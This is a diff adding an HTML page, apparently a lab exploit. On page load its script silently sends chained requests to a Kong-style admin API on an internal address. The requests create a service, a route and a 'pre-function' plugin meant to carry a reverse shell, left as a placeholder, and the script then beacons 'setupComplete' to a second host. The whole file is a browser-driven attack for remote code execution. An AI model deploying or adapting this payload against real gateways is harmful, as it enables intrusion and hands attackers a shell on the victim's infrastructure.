@@ -1,0 +1,39 @@
+<html>
+<head>
+<script>
+
+function createService() {
+    fetch("http://172.16.16.2:8001/services", {
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"donkey", "url": "http://127.0.0.1/"})
+    }).then(function (route) {
+      createRoute();
+    });
+}
+
+function createRoute() {
+    fetch("http://172.16.16.2:8001/services/donkey/routes", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"paths": ["/donkey"]})
+    }).then(function (plugin) {
+      createPlugin();
+    });  
+}
+
+function createPlugin() {
+    fetch("http://172.16.16.2:8001/services/donkey/plugins", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[  REVERSE SHELL HERE ]}})
+    }).then(function (callback) {
+      fetch("http://192.168.118.3/callback?setupComplete");
+    });  
+}
+</script>
+</head>
+<body onload='createService()'>
+<div></div>
+</body>
+</html>
